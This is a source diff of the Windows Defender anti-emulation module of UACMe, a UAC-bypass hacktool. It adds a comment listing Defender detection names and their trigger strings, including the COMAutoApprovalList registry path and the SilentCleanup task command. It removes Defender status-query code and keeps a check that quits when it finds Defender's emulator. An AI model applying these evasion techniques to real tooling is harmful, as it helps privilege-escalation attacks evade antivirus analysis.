@@ -4,9 +4,9 @@
 *
 *  TITLE:       WINDEFEND.C
 *
-*  VERSION:     3.27
+*  VERSION:     3.50
 *
-*  DATE:        10 Sep 2020
+*  DATE:        14 Sep 2020
 *
 *  MSE / Windows Defender anti-emulation part.
 *
@@ -64,29 +64,33 @@ ucmLoadCallback, dll load %ws, DllBase = %p
 UACMe injected, Hibiki at your service.
 ucmLoadCallback, kernel32 base found
 
+
+HackTool:Win64/UACMe.A!MSR
+
+Triggers:
+\REGISTRY\MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\UAC\COMAutoApprovalList
+run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" /i
+"UACMe main module
+UAC is now disabled.\nYou must reboot your computer for the changes to take effect.
+_FubukiProc4
+UACMe v3.1.9.1905
+\Software\KureND
+ArisuTsuberuku
+AkagiCompletionEvent
+AkagiSharedSection
+
+HackTool:Win32/Fubuki!MTB
+
+Triggers:
+AkagiSharedSection
+system32\
+_FubukiProc2
+mmc.exe
+\?\globalroot\systemroot\system32\sysprep\unbcl
+CorBindToRuntimeEx
+CreateUri
+
 */
-
-
-//
-// General purpose hashes start here.
-//
-
-#define WDStatus_Hash               0x5ed47491
-#define MpManagerOpen_Hash          0x156db96c
-#define MpHandleClose_Hash          0x1117328a
-#define MpManagerVersionQuery_Hash  0x214efb07
-
-//
-// End of general purpose hashes.
-//
-
-//
-// Kuma related hashes start here.
-//
-
-//
-// End of Kuma related hashes.
-//
 
 DWORD wdxEmulatorAPIHashTable[] = {
     0x70CE7692,
@@ -94,117 +98,10 @@ DWORD wdxEmulatorAPIHashTable[] = {
     0x7A99CFAE
 };
 
-MP_API g_MpApiSet;
-
 PVOID wdxGetProcedureAddressByHash(
     _In_ PVOID MpClientBase,
     _In_ DWORD ProcedureHash);
 
-/*
-* wdxInitApiSet
-*
-* Purpose:
-*
-* Retrieve required routine pointers from client dll.
-*
-*/
-BOOL wdxInitApiSet(
-    _In_ PVOID MpClientBase)
-{
-    g_MpApiSet.WDStatus.Hash = WDStatus_Hash;
-    g_MpApiSet.WDStatus.Routine = (pfnMpRoutine)wdxGetProcedureAddressByHash(
-        MpClientBase,
-        g_MpApiSet.WDStatus.Hash);
-
-    if (g_MpApiSet.WDStatus.Routine == NULL) return FALSE;
-
-    g_MpApiSet.MpHandleClose.Hash = MpHandleClose_Hash;
-    g_MpApiSet.MpHandleClose.Routine = (pfnMpRoutine)wdxGetProcedureAddressByHash(
-        MpClientBase,
-        g_MpApiSet.MpHandleClose.Hash);
-
-    if (g_MpApiSet.MpHandleClose.Routine == NULL) return FALSE;
-
-    g_MpApiSet.MpManagerOpen.Hash = MpManagerOpen_Hash;
-    g_MpApiSet.MpManagerOpen.Routine = (pfnMpRoutine)wdxGetProcedureAddressByHash(
-        MpClientBase,
-        g_MpApiSet.MpManagerOpen.Hash);
-
-    if (g_MpApiSet.MpManagerOpen.Routine == NULL) return FALSE;
-
-    g_MpApiSet.MpManagerVersionQuery.Hash = MpManagerVersionQuery_Hash;
-    g_MpApiSet.MpManagerVersionQuery.Routine = (pfnMpRoutine)wdxGetProcedureAddressByHash(
-        MpClientBase,
-        g_MpApiSet.MpManagerVersionQuery.Hash);
-
-    if (g_MpApiSet.MpManagerVersionQuery.Routine == NULL) return FALSE;
-
-    //
-    //  Kuma part.
-    //
-
-    return TRUE;
-}
-
-/*
-* wdGetAVSignatureVersion
-*
-* Purpose:
-*
-* Retrieve current AV signature version.
-*
-*/
-_Success_(return != FALSE)
-BOOL wdGetAVSignatureVersion(
-    _Out_ PMPCOMPONENT_VERSION SignatureVersion
-)
-{
-    BOOL bResult = FALSE;
-    MPHANDLE MpHandle;
-
-    MPVERSION_INFO VersionInfo;
-
-    pfnMpManagerOpen MpManagerOpen = (pfnMpManagerOpen)g_MpApiSet.MpManagerOpen.Routine;
-    pfnMpHandleClose MpHandleClose = (pfnMpHandleClose)g_MpApiSet.MpHandleClose.Routine;
-    pfnMpManagerVersionQuery MpManagerVersionQuery = (pfnMpManagerVersionQuery)g_MpApiSet.MpManagerVersionQuery.Routine;
-
-    if (S_OK == MpManagerOpen(0, &MpHandle)) {
-        RtlSecureZeroMemory(&VersionInfo, sizeof(VersionInfo));
-        bResult = (S_OK == MpManagerVersionQuery(MpHandle, &VersionInfo));
-        RtlCopyMemory(SignatureVersion, &VersionInfo.AVSignature, sizeof(VersionInfo.AVSignature));
-        MpHandleClose(MpHandle);
-    }
-    return bResult;
-}
-
-/*
-* wdIsEnabled
-*
-* Purpose:
-*
-* Return STATUS_TOO_MANY_SECRETS if WD is present and active.
-*
-*/
-NTSTATUS wdIsEnabled(
-    VOID)
-{
-    BOOL fEnabled = FALSE;
-    NTSTATUS status = STATUS_NOTHING_TO_TERMINATE;
-    pfnWDStatus WDStatus = (pfnWDStatus)g_MpApiSet.WDStatus.Routine;
-
-    if (WDStatus) 
-        if (SUCCEEDED(WDStatus(&fEnabled)))
-        {
-            if (fEnabled)
-                status = STATUS_TOO_MANY_SECRETS;
-            else
-                status = STATUS_NO_SECRETS;
-        }
-        else
-            status = STATUS_NO_SECRETS;
-
-    return status;
-}
 
 /*
 * wdxGetHashForString
@@ -238,7 +135,7 @@ DWORD wdxGetHashForString(
 *
 */
 PVOID wdxGetProcedureAddressByHash(
-    _In_ PVOID MpClientBase,
+    _In_ PVOID ImageBase,
     _In_ DWORD ProcedureHash
 )
 {
@@ -252,10 +149,12 @@ PVOID wdxGetProcedureAddressByHash(
 
     DWORD_PTR FunctionPtr;
 
-    DosHeader = (IMAGE_DOS_HEADER*)MpClientBase;
+    DosHeader = (IMAGE_DOS_HEADER*)ImageBase;
 
-    Exports = (IMAGE_EXPORT_DIRECTORY*)RtlImageDirectoryEntryToData(MpClientBase, TRUE,
-        IMAGE_DIRECTORY_ENTRY_EXPORT, &sz);
+    Exports = (IMAGE_EXPORT_DIRECTORY*)RtlImageDirectoryEntryToData(ImageBase, 
+        TRUE,
+        IMAGE_DIRECTORY_ENTRY_EXPORT, 
+        &sz);
 
     if (Exports == NULL)
         return NULL;
@@ -267,104 +166,12 @@ PVOID wdxGetProcedureAddressByHash(
     for (i = 0; i < Exports->NumberOfNames; i++) {
         if (wdxGetHashForString((char *)((PBYTE)DosHeader + Names[i])) == ProcedureHash) {
             FunctionPtr = Functions[Ordinals[i]];
-            return (PBYTE)MpClientBase + FunctionPtr;
+            return (PBYTE)ImageBase + FunctionPtr;
         }
     }
 
     return NULL;
 }
-
-/*
-* wdLoadClient
-*
-* Purpose:
-*
-* Load mpengine client dll for further work (e.g. Kuma).
-*
-* Limitations:
-*
-*   Warning: This routine will produce incorrect results under MS AV emulator.
-*
-*/
-_Success_(return != NULL)
-PVOID wdLoadClient(
-    _In_ BOOLEAN IsWow64,
-    _Out_opt_ PNTSTATUS Status
-)
-{
-    BOOL        bFound = FALSE;
-    HANDLE      hHeap = NtCurrentPeb()->ProcessHeap;
-    PVOID       ImageBase = NULL;
-    NTSTATUS    status = STATUS_UNSUCCESSFUL;
-
-    PWCHAR EnvironmentBlock = (PWCHAR)NtCurrentPeb()->ProcessParameters->Environment;
-    PWCHAR ptr, lpProgramFiles, lpBuffer;
-
-    UNICODE_STRING usTemp, *us;
-
-    SIZE_T memIO;
-
-    UNICODE_STRING us1 = RTL_CONSTANT_STRING(L"ProgramFiles=");
-    UNICODE_STRING us2 = RTL_CONSTANT_STRING(L"ProgramFiles(x86)=");
-
-    us = &us1;
-
-    if (IsWow64)
-        us = &us2;
-
-    ptr = EnvironmentBlock;
-
-    do {
-        if (*ptr == 0)
-            break;
-
-        RtlInitUnicodeString(&usTemp, ptr);
-        if (RtlPrefixUnicodeString(us, &usTemp, TRUE)) {
-            bFound = TRUE;
-            break;
-        }
-
-        ptr += _strlen(ptr) + 1;
-
-    } while (1);
-
-    if (bFound) {
-
-        lpProgramFiles = (ptr + us->Length / sizeof(WCHAR));
-
-        memIO = (MAX_PATH + _strlen(lpProgramFiles)) * sizeof(WCHAR);
-        lpBuffer = (PWCHAR)RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, memIO);
-        if (lpBuffer) {
-            _strcpy(lpBuffer, lpProgramFiles);
-            _strcat(lpBuffer, TEXT("\\Windows Defender\\MpClient.dll"));
-
-            RtlInitUnicodeString(&usTemp, lpBuffer);
-
-            status = LdrLoadDll(NULL, NULL, &usTemp, &ImageBase);
-
-            if (NT_SUCCESS(status)) {
-                if (!wdxInitApiSet(ImageBase)) {
-                    status = STATUS_PROCEDURE_NOT_FOUND;
-                    LdrUnloadDll(ImageBase);
-                    ImageBase = NULL;
-                }
-            }
-
-            RtlFreeHeap(hHeap, 0, lpBuffer);
-        }
-        else {
-            status = STATUS_NO_MEMORY;
-        }
-    }
-    else
-        status = STATUS_VARIABLE_NOT_FOUND;
-
-    if (Status) 
-        *Status = status;
-
-    return ImageBase;
-}
-
 /*
 * wdCheckEmulatedVFS
 *
@@ -390,7 +197,7 @@ VOID wdCheckEmulatedVFS(
     RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
     GetModuleFileName(NULL, szBuffer, MAX_PATH);
     if (_strstri(szBuffer, szMsEngVFS) != NULL) {
-        ExitProcess((UINT)0);
+        RtlExitUserProcess((UINT)0);
     }
 }
 
